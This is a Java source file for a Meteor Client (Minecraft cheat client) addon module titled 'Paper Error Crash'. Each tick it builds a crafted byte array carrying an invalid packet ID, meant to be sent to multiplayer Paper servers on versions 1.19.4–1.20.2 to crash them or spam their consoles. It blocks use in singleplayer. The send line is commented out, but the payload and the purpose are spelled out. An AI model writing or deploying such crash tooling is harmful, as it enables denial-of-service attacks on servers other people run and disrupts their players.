package me.reich.crash.modules;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelHandlerContext;
import me.reich.crash.Crash;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Category;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.ClientConnection;
import net.minecraft.network.packet.Packet;

import java.util.stream.IntStream;

public class GrimConsoleSpammer extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("Packets")
        .description("How many packets to send to the server.")
        .defaultValue(6)
        .sliderRange(1, 40)
        .build());

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("Auto Disable")
        .description("Disables module on kick.")
        .defaultValue(true)
        .build());

    public GrimConsoleSpammer() {
        super(Crash.CATEGORY, "Paper Error Crash", "works on 1.19.4~1.20.2");
    }

    private static final int INVALID_PACKET_ID = 7;
    private static final byte[] DATA = new byte[]{INVALID_PACKET_ID, 0, -49, -24, 11, 6, 0, 0};

    @Override
    public void onActivate() {
        if (mc.isIntegratedServerRunning()) {
            toggle();
            error("§cYou can't use this module in singleplayer.");
            return;
        }
    }

    @EventHandler
    public void onTick(TickEvent.Pre tickEvent) {
        for (int i = 0; i < packets.get(); i++) {
            ByteBuf packetBuffer = Unpooled.wrappedBuffer(DATA);
            //mc.player.networkHandler.connection.channel.pipeline().firstContext().writeAndFlush(packetBuffer);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
